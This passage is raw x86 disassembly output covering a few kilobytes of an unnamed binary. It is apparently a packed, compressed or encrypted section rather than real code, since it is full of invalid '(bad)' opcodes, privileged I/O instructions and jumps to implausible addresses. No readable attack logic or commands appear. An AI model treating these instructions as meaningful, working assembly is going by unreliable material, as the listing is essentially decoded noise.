  41895f:	ror    ch,cl
  418961:	es cmc 
  418963:	adc    al,0x1f
  418965:	aas    
  418966:	ja     0x418944
  418968:	repnz ins BYTE PTR es:[edi],dx
  41896a:	popa   
  41896b:	mov    ch,0x73
  41896d:	(bad)  
  41896e:	xor    al,0x1f
  418970:	or     ebp,DWORD PTR [ebp-0x77]
  418973:	aam    0x1f
  418975:	fs pop eax
  418977:	es sub ebp,ebx
  41897a:	call   0xaf74aabf
  41897f:	out    0xfd,al
  418981:	pusha  
  418982:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418983:	mov    bl,0xb0
  418985:	and    DWORD PTR [ebp+0x61],0xc82042b2
  41898c:	xchg   ebp,eax
  41898d:	std    
  41898e:	inc    ecx
  41898f:	sbb    DWORD PTR [ebx],esi
  418991:	xchg   BYTE PTR [esi],dh
  418993:	xor    eax,0x9768c1c6
  418998:	sbb    al,0x86
  41899a:	and    eax,edx
  41899c:	inc    edi
  41899d:	repz inc eax
  41899f:	xor    ch,BYTE PTR [edi]
  4189a1:	out    0x63,eax
  4189a3:	clc    
  4189a4:	adc    al,0x37
  4189a6:	aas    
  4189a7:	xchg   esi,eax
  4189a8:	or     eax,0x50ff024e
  4189ad:	stos   DWORD PTR es:[edi],eax
  4189ae:	bound  edi,QWORD PTR [esi+0x1d]
  4189b1:	aad    0xd7
  4189b3:	arpl   si,sp
  4189b5:	mov    fs,eax
  4189b7:	mov    eax,ds:0x3e053f1c
  4189bc:	fs push ecx
  4189be:	jne    0x418a2d
  4189c0:	sub    dh,dh
  4189c2:	or     bh,al
  4189c4:	rcr    dl,1
  4189c6:	or     DWORD PTR [esi],esp
  4189c8:	push   edx
  4189c9:	rol    ch,cl
  4189cb:	out    dx,eax
  4189cc:	into   
  4189cd:	sub    cl,BYTE PTR [eax+0x1051de3e]
  4189d3:	retf   0x5e9c
  4189d6:	sbb    eax,0xbde118bc
  4189db:	iret   
  4189dc:	(bad)  [ecx+0x771773fa]
  4189e2:	test   DWORD PTR [ecx-0x19fa3992],ebx
  4189e8:	cmc    
  4189e9:	or     esp,DWORD PTR [ebx+edi*4]
  4189ec:	sub    dl,bl
  4189ee:	dec    eax
  4189ef:	pop    esi
  4189f0:	add    ebp,edx
  4189f2:	push   0x1
  4189f4:	fs (bad) 
  4189f6:	fistp  QWORD PTR [edx+0x53a6e8cd]
  4189fc:	(bad)  
  4189fd:	fadd   QWORD PTR [esi]
  4189ff:	sub    BYTE PTR [edi+edi*8-0x244d7972],bh
  418a06:	sub    BYTE PTR [eax],dh
  418a08:	les    esi,FWORD PTR [ebp+edi*1+0x37]
  418a0c:	push   esi
  418a0d:	scas   al,BYTE PTR es:[edi]
  418a0e:	or     bl,dh
  418a10:	mov    ebx,0xf7363cbd
  418a15:	pusha  
  418a16:	jle    0x418a1a
  418a18:	mov    esi,DWORD PTR [eax]
  418a1a:	(bad)  
  418a1b:	cs (bad) 
  418a1e:	mov    bl,BYTE PTR [ebx]
  418a20:	mov    eax,DWORD PTR [ebp+0xc]
  418a23:	xor    eax,ecx
  418a25:	mov    ecx,DWORD PTR [ebp-0x8]
  418a28:	add    eax,edx
  418a2a:	imul   eax,ecx
  418a2d:	jmp    0x41adec
  418a32:	clc    
  418a33:	loope  0x4189be
  418a35:	mov    ah,0x87
  418a37:	test   bl,al
  418a39:	mov    ebp,0x3e8f68ea
  418a3e:	push   ebp
  418a3f:	mov    dl,0xfa
  418a41:	aas    
  418a42:	cmp    DWORD PTR [edi],ebx
  418a44:	popa   
  418a45:	(bad)  
  418a46:	rcr    BYTE PTR [edi+0x62],0x62
  418a4a:	mov    dh,0xaa
  418a4c:	sub    ch,BYTE PTR ds:0x987a0b1b
  418a52:	fidivr WORD PTR [edi]
  418a54:	jbe    0x418ab5
  418a56:	fwait
  418a57:	add    eax,0x7fa5e91d
  418a5c:	pop    esp
  418a5d:	lahf   
  418a5e:	push   edi
  418a5f:	shr    dh,0x9d
  418a62:	mov    ebx,0x4d7cf7c1
  418a67:	jmp    0x418a05
  418a69:	repz inc ecx
  418a6b:	mov    edi,DWORD PTR [esi]
  418a6d:	retf   0xf6a6
  418a70:	push   0x55fc6daf
  418a75:	or     DWORD PTR [ecx],ecx
  418a77:	mov    edx,edi
  418a79:	jns    0x418ace
  418a7b:	fs adc ebx,edi
  418a7e:	dec    eax
  418a7f:	repz aas 
  418a81:	hlt    
  418a82:	out    0x4a,eax
  418a84:	add    edx,DWORD PTR [edx]
  418a86:	outs   dx,BYTE PTR ds:[esi]
  418a87:	in     al,0xf9
  418a89:	adc    BYTE PTR [edi+0x3a],ah
  418a8c:	dec    esi
  418a8d:	lds    esi,FWORD PTR [eax+0x109f1238]
  418a93:	push   cs
  418a94:	push   esi
  418a95:	rol    BYTE PTR [edx],1
  418a97:	xor    ebp,DWORD PTR [ecx+eax*1]
  418a9a:	cli    
  418a9b:	sbb    BYTE PTR [edx+0x18454fb5],ch
  418aa1:	fnstcw WORD PTR [eax+0x347819db]
  418aa7:	inc    ebp
  418aa8:	add    dh,BYTE PTR [esi+0x759f943e]
  418aae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418aaf:	jg     0x418ab3
  418ab1:	mov    edx,DWORD PTR [ebx+edx*2+0x8]
  418ab5:	xchg   BYTE PTR [esi+0x76],dl
  418ab8:	add    al,0x3a
  418aba:	retf   
  418abb:	inc    edx
  418abc:	jnp    0x418ac7
  418abe:	cmp    al,BYTE PTR [edi+0x43]
  418ac1:	jae    0x418b0e
  418ac3:	pop    ebx
  418ac4:	mov    eax,DWORD PTR ds:0x35435b5b
  418aca:	xor    eax,0x3b1a4f08
  418acf:	loopne 0x418ae4
  418ad1:	inc    esp
  418ad2:	(bad)  
  418ad3:	(bad)  
  418ad4:	cmp    ebp,DWORD PTR [esp+edi*8+0x30]
  418ad8:	sub    eax,0x7cfa7067
  418add:	add    ch,0xd3
  418ae0:	test   eax,0x960854d1
  418ae5:	repnz cmp eax,0x38fb71c4
  418aeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418aec:	pop    esp
  418aed:	jnp    0x418b39
  418aef:	ss jbe 0x418b10
  418af2:	adc    eax,0x65c9ab34
  418af7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418af8:	in     eax,0x5c
  418afa:	ffree  st(0)
  418afc:	mov    DWORD PTR [esp+edi*8+0x3b],eax
  418b00:	lahf   
  418b01:	das    
  418b02:	xchg   ebp,eax
  418b03:	into   
  418b04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b05:	shl    DWORD PTR [ecx],1
  418b07:	sbb    DWORD PTR [esi],0x1b9d4783
  418b0d:	rcl    DWORD PTR [ebx-0x75725464],1
  418b13:	xor    BYTE PTR [edi-0x3dd73dec],al
  418b19:	pop    esi
  418b1a:	or     dl,al
  418b1c:	sbb    DWORD PTR [eax-0x13],edi
  418b1f:	jl     0x418ac3
  418b21:	or     ch,cl
  418b23:	neg    edx
  418b25:	pop    edx
  418b26:	lahf   
  418b27:	adc    dh,al
  418b29:	dec    edx
  418b2a:	pop    es
  418b2b:	aam    0xd4
  418b2d:	mov    ebx,0x14c92551
  418b32:	cli    
  418b33:	xchg   ebp,eax
  418b34:	jmp    0x418af7
  418b36:	mov    ch,BYTE PTR [edi+0x772aef5c]
  418b3c:	cs cdq 
  418b3e:	aam    0xeb
  418b40:	(bad)  
  418b41:	(bad)  
  418b42:	jle    0x418b87
  418b44:	sbb    ebx,edx
  418b46:	aad    0x6d
  418b48:	(bad)
  418b4c:	hlt    
  418b4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b4e:	or     ch,BYTE PTR [ecx+0x76]
  418b51:	sahf   
  418b52:	arpl   WORD PTR [edi],di
  418b54:	aad    0x2b
  418b56:	push   ss
  418b57:	jl     0x418b92
  418b59:	(bad)  
  418b5b:	dec    eax
  418b5c:	push   ss
  418b5d:	cmp    ebp,DWORD PTR [ebp+0x16]
  418b60:	pop    esp
  418b61:	ds mov dh,0xa
  418b64:	(bad)  
  418b65:	loop   0x418b0e
  418b67:	arpl   WORD PTR gs:[esi+0x47],bp
  418b6b:	iret   
  418b6c:	nop
  418b6d:	in     eax,dx
  418b6e:	shl    DWORD PTR [edx],cl
  418b70:	cli    
  418b71:	cld    
  418b72:	mov    eax,DWORD PTR [edx]
  418b74:	cdq    
  418b75:	dec    ecx
  418b76:	int3   
  418b77:	retf   0x2248
  418b7a:	sahf   
  418b7b:	adc    ch,ah
  418b7d:	icebp  
  418b7e:	push   ecx
  418b7f:	xchg   ebp,eax
  418b80:	ror    DWORD PTR [ebp+edi*1+0x7a],0x12
  418b85:	sahf   
  418b86:	mov    ebp,ebx
  418b88:	push   ss
  418b89:	outs   dx,BYTE PTR ds:[esi]
  418b8a:	jle    0x418be3
  418b8c:	out    0x83,eax
  418b8e:	mov    eax,ds:0x6f14062b
  418b93:	xor    DWORD PTR fs:[ecx-0x5c],ebp
  418b97:	ret    0xbd05
  418b9a:	ds aaa 
  418b9c:	rcr    al,cl
  418b9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b9f:	adc    DWORD PTR [ecx],esp
  418ba1:	daa    
  418ba2:	popa   
  418ba3:	cld    
  418ba4:	leave  
  418ba5:	cmp    al,0x9a
  418ba7:	cmp    eax,edx
  418ba9:	mov    ch,0x31
  418bab:	pop    esp
  418bac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bad:	repz sar bl,cl
  418bb0:	mov    ebx,0xa241e4b6
  418bb5:	xchg   esp,eax
  418bb6:	leave  
  418bb7:	xlat   BYTE PTR ds:[ebx]
  418bb8:	add    BYTE PTR [eax+0xd59c6af],al
  418bbe:	xor    al,0xf8
  418bc0:	clc    
  418bc1:	cmp    ecx,0x23
  418bc4:	mov    cl,0x84
  418bc6:	xlat   BYTE PTR ds:[ebx]
  418bc7:	adc    ch,bl
  418bc9:	pusha  
  418bca:	imul   edi,DWORD PTR [edi+0x3f],0x12
  418bce:	cmp    bl,dh
  418bd0:	inc    edi
  418bd1:	pop    edi
  418bd2:	ins    DWORD PTR es:[edi],dx
  418bd3:	pop    es
  418bd4:	mov    edx,gs
  418bd6:	dec    ebp
  418bd7:	mov    WORD PTR [edi+0x717cf938],?
  418bdd:	mov    al,ds:0xd184776b
  418be2:	sahf   
  418be3:	push   ebp
  418be4:	ss es dec edi
  418be7:	sbb    BYTE PTR [ebx+0x3c0c8d02],0x7f
  418bee:	mov    bh,0x4c
  418bf0:	(bad)  
  418bf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bf2:	bound  edx,QWORD PTR [ecx+0x7d]
  418bf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bf6:	and    DWORD PTR [edx-0x67343571],esp
  418bfc:	jo     0x418bcf
  418bfe:	ja     0x418c17
  418c00:	mov    al,ds:0x5e289042
  418c05:	aam    0xe0
  418c07:	fmulp  st(7),st
  418c09:	pop    ebx
  418c0a:	xchg   esp,eax
  418c0b:	in     al,0x21
  418c0d:	xor    al,0x44
  418c0f:	inc    edi
  418c10:	test   DWORD PTR [ecx-0x1954c053],ebx
  418c16:	inc    esp
  418c17:	jmp    0x418c53
  418c19:	(bad)  
  418c1a:	inc    edi
  418c1b:	fadd   QWORD PTR [edx]
  418c1d:	mov    es,WORD PTR [ecx+0x1e63f0a4]
  418c23:	js     0x418c91
  418c25:	in     eax,0x4f
  418c27:	inc    esi
  418c28:	or     eax,0xab3a14da
  418c2d:	loope  0x418c55
  418c2f:	xor    al,0xb7
  418c31:	mov    ecx,0xf77e1f11
  418c36:	(bad)  [ebp+0x72]
  418c39:	push   edi
  418c3a:	loope  0x418c2f
  418c3c:	hlt    
  418c3d:	push   esi
  418c3e:	icebp  
  418c3f:	out    dx,eax
  418c40:	loope  0x418bfa
  418c42:	cmc    
  418c43:	jns    0x418c80
  418c45:	pop    edi
  418c46:	ins    DWORD PTR es:[edi],dx
  418c47:	cdq    
  418c48:	adc    eax,0x1fc2760c
  418c4d:	inc    esi
  418c4e:	mov    edi,0x9c46266b
  418c53:	ret    0x6cd3
  418c56:	ror    esi,1
  418c58:	sub    al,0x23
  418c5a:	push   ebx
  418c5b:	jnp    0x418c66
  418c5d:	pop    edx
  418c5e:	loop   0x418cd2
  418c60:	push   eax
  418c61:	sub    ah,BYTE PTR [eax]
  418c63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c64:	fbstp  TBYTE PTR [edi-0x21]
  418c67:	lds    esp,FWORD PTR [edx+0x1c]
  418c6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c6b:	jle    0x418c9b
  418c6d:	inc    esi
  418c6e:	sbb    DWORD PTR [eax+0x78c5d854],0x2b
  418c75:	pop    ecx
  418c76:	or     eax,ebp
  418c78:	or     eax,0x6781a07d
  418c7d:	data16 and al,0x57
  418c80:	pop    ebx
  418c81:	jmp    0x141e:0x87b56671
  418c88:	std    
  418c89:	int    0xfd
  418c8b:	ret    
  418c8c:	mov    al,0xce
  418c8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c8f:	ror    DWORD PTR cs:[edi+0x65124527],cl
  418c96:	xchg   esi,eax
  418c97:	cmp    BYTE PTR [ebx],bh
  418c99:	xchg   edx,eax
  418c9a:	add    dl,BYTE PTR [ebp+0x2dc168a]
  418ca0:	fs sub ch,BYTE PTR es:[ecx+0x11]
  418ca5:	xchg   ecx,eax
  418ca6:	aaa    
  418ca7:	nop
  418ca8:	mov    al,ds:0x9e86a0a9
  418cad:	mov    eax,0xa4cf5135
  418cb2:	jns    0x418cd9
  418cb4:	cmp    edx,DWORD PTR [esi-0x308a7861]
  418cba:	cmc    
  418cbb:	pop    ds
  418cbc:	jge    0x418d38
  418cbe:	ss hlt 
  418cc0:	retf   
  418cc1:	inc    esi
  418cc2:	xchg   esi,ebp
  418cc4:	nop
  418cc5:	(bad)  
  418cc6:	rol    DWORD PTR [esi],1
  418cc8:	getsec 
  418cca:	nop
  418ccb:	(bad)  
  418ccc:	sti    
  418ccd:	gs xor al,0x4c
  418cd0:	pop    esi
  418cd1:	sets   BYTE PTR [ebx-0x20]
  418cd5:	jb     0x418c6c
  418cd7:	jle    0x418cfa
  418cd9:	xlat   BYTE PTR ds:[ebx]
  418cda:	jae    0x418cd8
  418cdc:	dec    ebx
  418cdd:	push   ds
  418cde:	cmc    
  418cdf:	xor    BYTE PTR [edx],al
  418ce1:	cli    
  418ce2:	pop    edi
  418ce3:	xchg   ebx,eax
  418ce4:	mov    edx,0xcdc3900d
  418ce9:	enter  0x8567,0x67
  418ced:	adc    al,dh
  418cef:	mov    al,ds:0x5105272b
  418cf4:	push   es
  418cf5:	mov    ebx,0xae674cc1
  418cfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418cfb:	and    eax,0xdc8fcfda
  418d00:	sbb    edi,DWORD PTR [ebp+0x6f]
  418d03:	imul   esi,DWORD PTR ds:0x756d91d,0xc1a397e0
  418d0d:	popa   
  418d0e:	mov    bh,0x2f
  418d10:	jl     0x418d62
  418d12:	out    dx,eax
  418d13:	arpl   WORD PTR [esi],dx
  418d15:	cdq    
  418d16:	mov    ?,WORD PTR gs:[edx]
  418d19:	sbb    esi,eax
  418d1b:	mov    al,ds:0xe0d2393d
  418d20:	xor    DWORD PTR [ecx-0x7bbed646],0x2c
  418d27:	or     DWORD PTR [eax],ebx
  418d29:	cs xor al,0x65
  418d2c:	call   0xf4a8af04
  418d31:	dec    ebp
  418d32:	lods   eax,DWORD PTR ds:[esi]
  418d33:	pusha  
  418d34:	lds    esi,FWORD PTR [esi-0x15]
  418d37:	pop    ds
  418d38:	daa    
  418d39:	outs   dx,BYTE PTR ds:[esi]
  418d3a:	outs   dx,BYTE PTR ds:[esi]
  418d3b:	in     eax,0x48
  418d3d:	jbe    0x418d48
  418d3f:	or     ch,BYTE PTR [ebp+0x6a2d0f7b]
  418d45:	jbe    0x418d9c
  418d47:	nop
  418d48:	push   ebx
  418d49:	sbb    BYTE PTR [eax-0x45],ah
  418d4c:	add    ebp,DWORD PTR [ebx]
  418d4e:	and    ebx,DWORD PTR [edx]
  418d50:	leave  
  418d51:	pushf  
  418d52:	mov    BYTE PTR [esi+0x3b15f7ef],ah
  418d58:	dec    ebx
  418d5a:	add    BYTE PTR [ecx-0x619dd067],0x78
  418d61:	sbb    ecx,DWORD PTR [ebp+0x497489f5]
  418d67:	test   DWORD PTR [ecx-0x60],edx
  418d6a:	mov    ch,0xf9
  418d6c:	pop    es
  418d6d:	lock sahf 
  418d6f:	or     DWORD PTR [edi+eiz*4+0x65],eax
  418d73:	loop   0x418d72
  418d75:	aad    0x76
  418d77:	mov    DWORD PTR [eax],edi
  418d79:	mov    bl,0xf3
  418d7b:	test   al,0x68
  418d7d:	ja     0x418d5b
  418d7f:	lahf   
  418d80:	dec    edx
  418d81:	or     eax,0x29574d92
  418d86:	jne    0x418d20
  418d88:	mov    ecx,0x916f9af5
  418d8d:	ficomp WORD PTR [edx+0x513913e3]
  418d93:	dec    esp
  418d94:	jl     0x418dc1
  418d96:	mov    al,ds:0x1608e4a4
  418d9b:	dec    esp
  418d9c:	test   dl,cl
  418d9e:	dec    esp
  418d9f:	push   eax
  418da0:	xchg   DWORD PTR [esi+0x2f],edx
  418da3:	addr16 mov dh,0x1f
  418da6:	scas   al,BYTE PTR es:[edi]
  418da7:	ja     0x418e15
  418da9:	mov    ah,0x14
  418dab:	and    edi,ebp
  418dad:	inc    esi
  418dae:	cwde   
  418daf:	xchg   BYTE PTR [edi-0xa],ah
  418db2:	test   eax,0xa2daca01
  418db7:	cmp    dh,BYTE PTR [eax-0x7fbfc68f]
  418dbd:	mov    al,0x3e
  418dbf:	pop    ds
  418dc0:	imul   edx,DWORD PTR [edx],0x72eb2cc4
  418dc6:	and    DWORD PTR [ecx+eax*2],edx
  418dc9:	cmp    BYTE PTR ds:0x2b126150,al
  418dcf:	jns    0x418dd4
  418dd1:	lock lea edi,[ecx+ebp*8+0x5f]
  418dd6:	pop    ebx
  418dd7:	ins    DWORD PTR es:[edi],dx
  418dd8:	fidiv  DWORD PTR [edx+0x6c94bb49]
  418dde:	cmp    eax,0x3d73d46b
  418de3:	outs   dx,BYTE PTR ds:[esi]
  418de4:	add    eax,0x46431055
  418de9:	ins    BYTE PTR es:[edi],dx
  418dea:	cmc    
  418deb:	mov    bl,0xe0
  418ded:	lea    eax,[ebx-0x7582f832]
  418df3:	inc    esp
  418df4:	jne    0x418ddf
  418df6:	nop
  418df7:	jne    0x418e53
  418df9:	outs   dx,DWORD PTR ds:[esi]
  418dfa:	mov    dh,0x67
  418dfc:	enter  0x9622,0xc7
  418e00:	xlat   BYTE PTR ds:[ebx]
  418e01:	sbb    al,BYTE PTR [ebp-0x50]
  418e04:	mov    al,ds:0x1866b494
  418e09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e0a:	aas    
  418e0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e0c:	fwait
  418e0d:	shr    DWORD PTR [ebx+0x283416fb],cl
  418e13:	pop    es
  418e14:	out    dx,al
  418e15:	and    eax,0x95e5b58d
  418e1a:	(bad)  
  418e1b:	pop    edx
  418e1c:	pop    ecx
  418e1d:	pop    esi
  418e1e:	sbb    eax,0xd78d1994
  418e23:	sti    
  418e24:	jno    0x418dfd
  418e26:	mov    edi,0xd420a92a
  418e2b:	dec    edi
  418e2c:	inc    edx
  418e2d:	and    BYTE PTR [edx+ebp*1],0xa2
  418e31:	outs   dx,DWORD PTR ds:[esi]
  418e32:	fndisi(8087 only) 
  418e34:	sub    eax,0x7d79b1c7
  418e39:	(bad)  
  418e3a:	js     0x418e8c
  418e3c:	push   ecx
  418e3d:	xor    ah,BYTE PTR [ecx]
  418e3f:	pop    ss
  418e40:	dec    ebx
  418e41:	sbb    al,0x50
  418e43:	mov    eax,DWORD PTR [ecx-0x6d]
  418e46:	mov    BYTE PTR [ecx],al
  418e48:	jmp    0x15c1d7b8
  418e4d:	repnz mov esi,ss
  418e50:	fld    QWORD PTR [esi-0x7]
  418e53:	test   BYTE PTR [ebx],dh
  418e55:	xchg   edi,eax
  418e56:	xchg   esp,eax
  418e57:	mov    DWORD PTR [ecx],edx
  418e59:	dec    ebx
  418e5a:	test   dl,ch
  418e5c:	pop    ebp
  418e5d:	aam    0x16
  418e5f:	mov    dh,BYTE PTR [ebx+edx*4-0x144554f0]
  418e66:	into   
  418e67:	neg    BYTE PTR [esi-0x17]
  418e6a:	inc    ebx
  418e6b:	dec    edi
  418e6c:	xchg   BYTE PTR [ebx-0x5527b942],bl
  418e72:	mov    edx,0xb458bb79
  418e77:	je     0x418eed
  418e79:	stos   BYTE PTR es:[edi],al
  418e7a:	fst    QWORD PTR [ecx+0x7983db88]
  418e80:	add    ah,dl
  418e82:	cmp    eax,0x778e64c5
  418e87:	or     BYTE PTR [esi+0x38edba70],cl
  418e8d:	inc    esp
  418e8e:	inc    ebp
  418e8f:	add    esp,ecx
  418e91:	xor    DWORD PTR [esi],edi
  418e93:	mov    edx,0xb9440d15
  418e98:	xor    DWORD PTR [eax-0x4],ebp
  418e9b:	mov    ch,ch
  418e9d:	xchg   edi,eax
  418e9e:	bound  esi,QWORD PTR [edi+0x45]
  418ea1:	jecxz  0x418ee1
  418ea3:	xchg   edx,eax
  418ea4:	shr    BYTE PTR [eax+0x42ff0163],1
  418eaa:	inc    edi
  418eab:	cld    
  418eac:	scas   eax,DWORD PTR es:[edi]
  418ead:	xor    al,0xe7
  418eaf:	inc    esi
  418eb0:	jne    0x418e4f
  418eb2:	nop
  418eb3:	xchg   edi,eax
  418eb4:	cwde   
  418eb5:	test   eax,0x1f96eef7
  418eba:	bound  edx,QWORD PTR ds:0x8f9ae080
  418ec0:	dec    ecx
  418ec1:	sub    BYTE PTR [eax-0x192f22c5],dl
  418ec7:	mov    bl,0x2f
  418ec9:	stc    
  418eca:	retf   0x43a
  418ecd:	dec    ebx
  418ece:	adc    al,BYTE PTR [ebx-0x50e2f2c3]
  418ed4:	add    edx,edi
  418ed6:	inc    edx
  418ed7:	popf   
  418ed8:	lds    edi,FWORD PTR [ebx+0x7b094f62]
  418ede:	dec    esp
  418edf:	dec    ebx
  418ee0:	sar    dh,cl
  418ee2:	push   ds
  418ee3:	pop    ebx
  418ee4:	inc    esp
  418ee5:	std    
  418ee6:	or     esp,edx
  418ee8:	cli    
  418ee9:	test   DWORD PTR [ebx],edi
  418eeb:	sub    ch,dh
  418eed:	sub    DWORD PTR [ebp+eax*4-0x51217566],ecx
  418ef4:	loop   0x418f64
  418ef6:	inc    ecx
  418ef7:	test   DWORD PTR [bx+si],ebx
  418efa:	push   edx
  418efb:	xchg   edi,eax
  418efc:	out    dx,al
  418efd:	xchg   edx,eax
  418efe:	popf   
  418eff:	xchg   edx,eax
  418f00:	mov    ebp,DWORD PTR [ecx+0x101e908b]
  418f06:	push   es
  418f07:	call   0x992a:0xe3e0321c
  418f0e:	int    0x76
  418f10:	and    BYTE PTR [esi],ch
  418f12:	cmp    ebx,DWORD PTR ds:0x798011e6
  418f18:	aas    
  418f19:	out    0x5c,al
  418f1b:	mov    dl,0x62
  418f1d:	or     al,0xa2
  418f1f:	jmp    0xe61da54a
  418f24:	cwde   
  418f25:	push   ss
  418f26:	retf   0xde1c
  418f29:	scas   al,BYTE PTR es:[edi]
  418f2a:	pop    esp
  418f2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f2c:	out    0xcf,eax
  418f2e:	into   
  418f2f:	mov    ds:0x35a62034,eax
  418f34:	imul   esp,edi,0xffffffee
  418f37:	pop    edx
  418f38:	xor    eax,0xaf35ff27
  418f3d:	jmp    ebp
  418f3f:	cs out 0x29,eax
  418f42:	xchg   edi,eax
  418f43:	push   ebx
  418f44:	retf   0xd918
  418f47:	fadd   QWORD PTR [ecx-0x39]
  418f4a:	pop    edi
  418f4b:	mov    ds:0xd2cc21c,al
  418f50:	dec    esp
  418f51:	inc    ebp
  418f52:	push   esp
  418f53:	jmp    0x904e6139
  418f58:	fcomi  st,st(2)
  418f5a:	int    0x1c
  418f5c:	inc    BYTE PTR [edx+0x405df2ae]
  418f62:	(bad)  
  418f63:	sbb    eax,0x33ebacae
  418f68:	icebp  
  418f69:	mov    ecx,0x5ae92ae3
  418f6e:	(bad)  
  418f6f:	sbb    eax,0x7238e006
  418f74:	mov    ah,0x63
  418f76:	in     al,0xa4
  418f78:	sub    bl,ch
  418f7a:	mov    ebp,0x1b84de09
  418f7f:	bound  edx,QWORD PTR [edx]
  418f81:	in     al,dx
  418f82:	in     eax,dx
  418f83:	out    dx,al
  418f84:	imul   BYTE PTR [edi-0x2fca7b8d]
  418f8a:	mov    bl,0xe1
  418f8d:	push   ecx
  418f8e:	xor    BYTE PTR [edi-0x2a],ah
  418f91:	jbe    0x418f79
  418f93:	push   esp
  418f94:	sub    al,0xb2
  418f96:	sub    eax,0x93e6a23
  418f9b:	add    BYTE PTR [edi-0x6c550334],ah
  418fa1:	or     al,0x5a
  418fa3:	or     eax,0x951d3890
  418fa8:	add    ah,BYTE PTR [eax]
  418faa:	outs   dx,BYTE PTR ds:[esi]
  418fab:	lods   al,BYTE PTR ds:[esi]
  418fac:	lods   eax,DWORD PTR ds:[esi]
  418fad:	and    bh,BYTE PTR [ecx-0x616d8014]
  418fb3:	scas   eax,DWORD PTR es:[edi]
  418fb4:	push   ss
  418fb5:	out    0xe1,al
  418fb7:	or     DWORD PTR gs:[edx-0x54],edi
  418fbb:	aas    
  418fbc:	pop    eax
  418fbd:	stc    
  418fbe:	mov    ch,0x9c
  418fc0:	das    
  418fc1:	mov    DWORD PTR [eax],edi
  418fc3:	push   esp
  418fc4:	jo     0x418f8b
  418fc6:	fmul   DWORD PTR [edx+0x1c]
  418fc9:	out    dx,eax
  418fca:	and    DWORD PTR [eax+0x7b7111d9],ebx
  418fd0:	dec    ecx
  418fd1:	ja     0x418f98
  418fd3:	pop    ss
  418fd4:	jo     0x418f9e
  418fd6:	fdiv   QWORD PTR [ebp+ebx*2-0x341e8160]
  418fdd:	nop
  418fde:	ret    0x3043
  418fe1:	lock sub DWORD PTR [eax+0x12],esp
  418fe5:	sub    eax,0x81581db1
  418fea:	int3   
  418feb:	or     ch,cl
  418fed:	push   ds
  418fee:	fcomp  st(3)
  418ff0:	stc    
  418ff1:	or     dh,BYTE PTR [edi+esi*2-0x4577566b]
  418ff8:	cmp    BYTE PTR [edi+ecx*8-0x7],al
  418ffc:	jo     0x419038
  418ffe:	test   al,0x9e
  419000:	or     BYTE PTR [edx],0xca
  419003:	arpl   sp,cx
  419005:	adc    eax,0x311dbee3
  41900a:	or     al,0x83
  41900c:	sbb    DWORD PTR [edi-0x28],esi
  41900f:	aas    
  419010:	cwde   
  419011:	sti    
  419012:	cmp    esp,eax
  419014:	pushf  
  419015:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419016:	mov    DWORD PTR [ecx],esp
  419018:	xor    al,0x5
  41901a:	cmp    al,cl
  41901c:	inc    ebx
  41901d:	les    ecx,FWORD PTR [edi+0x0]
  419020:	es out dx,al
  419022:	push   edi
  419023:	icebp  
  419024:	and    al,0x12
  419026:	fimul  DWORD PTR [edx+0x40]
  419029:	sub    DWORD PTR [ecx],edx
  41902b:	cmp    ebp,DWORD PTR [edi]
  41902d:	push   ebx
  41902e:	jecxz  0x41906e
  419030:	ins    DWORD PTR es:[edi],dx
  419031:	mov    cl,0x41
  419033:	cmp    BYTE PTR [ecx+0x18],bh
  419036:	std    
  419037:	dec    edi
  419038:	and    esp,DWORD PTR [esi-0x45]
  41903b:	add    DWORD PTR [edi],ebp
  41903d:	or     DWORD PTR [edi+0x602dce32],ecx
  419043:	call   DWORD PTR [edx]
  419045:	shr    cl,1
  419047:	je     0x41901f
  419049:	xor    BYTE PTR [eax],0xcc
  41904c:	jb     0x41905d
  41904e:	push   edi
  41904f:	sbb    BYTE PTR [edi-0x50],0x21
  419053:	cmp    DWORD PTR [edx-0x59],ebp
  419056:	jp     0x419034
  419058:	ret    
  419059:	sahf   
  41905a:	loop   0x419013
  41905c:	push   edx
  41905d:	sbb    al,0x63
  41905f:	mov    ebx,0x64e5203
  419064:	rcr    BYTE PTR [eax+0x73d7fd61],cl
  41906a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41906b:	rcr    cl,0xf9
  41906e:	jne    0x419054
  419070:	fist   DWORD PTR [edx]
  419072:	lods   al,BYTE PTR ds:[esi]
  419073:	jb     0x4190b2
  419075:	mov    fs:0x9c3c8f8b,eax
  41907b:	sbb    DWORD PTR [ebx],edx
  41907d:	sar    BYTE PTR [esi-0x4a78c0ac],0x71
  419084:	or     BYTE PTR [esi+eiz*2-0x33],dh
  419088:	or     bl,BYTE PTR [ecx+edx*4+0x76]
  41908c:	cli    
  41908d:	mov    dh,0xc1
  41908f:	pop    edx
  419090:	mov    ch,0xa0
  419092:	nop
  419093:	and    ebx,DWORD PTR ds:0xc0ad4987
  419099:	mov    eax,0x6c687490
  41909e:	cmp    BYTE PTR [edi-0x3d6b3b20],ah
  4190a4:	ds xchg edi,eax
  4190a6:	sub    al,0x95
  4190a8:	push   edx
  4190a9:	mov    edx,0x3d6bb396
  4190ae:	iret   
  4190af:	call   DWORD PTR [eax+0x47]
  4190b2:	jns    0x41911d
  4190b4:	mov    esp,0xd6d480f7
  4190b9:	sbb    al,0x2f
  4190bb:	xchg   esi,eax
  4190bc:	and    DWORD PTR [ecx-0x7c],0x43
  4190c0:	test   DWORD PTR [edx],esi
  4190c2:	stos   BYTE PTR es:[edi],al
